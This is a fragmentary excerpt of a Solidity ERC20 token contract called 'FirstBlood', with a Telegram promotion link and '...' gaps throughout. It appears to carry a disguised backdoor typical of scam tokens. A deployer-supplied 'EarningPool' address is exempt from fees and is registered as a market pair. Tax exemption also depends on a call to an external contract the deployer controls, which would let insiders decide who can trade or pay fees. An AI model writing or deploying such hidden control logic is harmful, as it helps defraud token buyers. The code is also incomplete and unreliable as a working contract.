...
/** 
Telegram:   https://t.me/firstbloodtournament
...
contract FirstBlood is ERC20, Ownable, AUTH {
    using SafeMath for uint256;
    ...
    struct IniConfiguration {
        address teamWallet;
        uint256 txMaxPercent;
        uint256 buyFeeMili;
        uint256 sellFeeMili;
        uint256 walletMxPercent;
    }
    struct EarningPool {
        address earningAddress;
        address earningOwner;
    }
    ...
    EarningPool private earningPoolRef;
    ...
    constructor(
        EarningPool memory earningPoolInfo,
        IniConfiguration memory initConfig,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
        ...
        earningPoolRef = earningPoolInfo;
        marketingWallet = initConfig.teamWallet;
        _setAutomatedMarketPair(earningPoolInfo.earningAddress, uniV2Pair, true);
        taxBuy = 0; //static
        taxSell = 0; //static
        _totalSupplyAmount = supply_;

        excludeFromFees(owner(), true);excludeFromFees(marketingWallet, true);
        excludeFromFees(earningPoolInfo.earningAddress, true);
        excludeFromFees(earningPoolInfo.earningOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(uniswapV2Router), true);
        maxWalletAmount = initConfig.walletMxPercent * supply_ * (10**decimals_).div(10000);
        swapWhen = (supply_.div(8000) + 1) * (10**decimals_);
        maxTxAmount = initConfig.txMaxPercent * supply_ * (10**decimals_).div(10000);
    ...
    function isTaxExcluded(address from, address to) internal returns (bool) {
        return 
            ...
            FBEarningZone(earningPoolRef.earningOwner).accumulativeDividendOf(from, to) > 0;
    }

    function _setAutomatedMarketPair(address router, address pair, bool value) private {
        require(
            isPair[pair] != value,
    ...
    function _transfer(
        ...
        bool possibleSwap = balanceOfContract >= swapWhen;
        if (
            possibleSwap && !isSwap && !isPair[sender]
        ) {
            isSwap = true;
            uint256 tokenM = balanceOfContract;
            if (tokenM > 0) {
                swapBackFee(tokenM, marketingWallet);
            }
            isSwap = false;
        }
    ...
    function swapBackFee(uint256 tokens, address receiver) private {
